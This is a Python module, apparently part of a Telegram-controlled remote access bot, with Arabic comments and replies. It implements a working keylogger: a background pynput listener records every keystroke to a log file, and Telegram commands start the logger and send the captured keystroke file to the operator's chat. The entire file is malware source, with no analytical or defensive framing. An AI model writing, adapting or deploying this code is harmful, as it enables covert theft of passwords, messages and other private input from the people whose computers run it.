import os
import threading
from telegram import Update
from telegram.ext import ContextTypes

keylogger_active = False

def keylogger_worker():
    """تشغيل الكيلوغر في الخلفية"""
    import pynput.keyboard as kb
    logs = ""
    def on_press(key):
        nonlocal logs
        try:
            logs += key.char
        except:
            logs += f" [{key}] "
        if len(logs) > 100:
            with open("logs/keylogs.txt", "a") as f:
                f.write(logs)
            logs = ""
    with kb.Listener(on_press=on_press) as listener:
        listener.join()

async def start_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylogger_active
    if keylogger_active:
        await update.message.reply_text("⚠️ الكيلوغر يعمل بالفعل.")
        return
    keylogger_active = True
    threading.Thread(target=keylogger_worker, daemon=True).start()
    await update.message.reply_text("✅ تم تشغيل الكيلوغر.")

async def stop_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylogger_active
    keylogger_active = False
    await update.message.reply_text("🛑 تم إيقاف الكيلوغر.")

async def get_keylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists("logs/keylogs.txt"):
        with open("logs/keylogs.txt", "r") as f:
            logs = f.read()
        await context.bot.send_document(
            chat_id=update.effective_user.id,
            document=open("logs/keylogs.txt", 'rb'),
            caption="📜 سجل الضغطات"
        )
    else:
        await update.message.reply_text("📭 لا توجد سجلات.")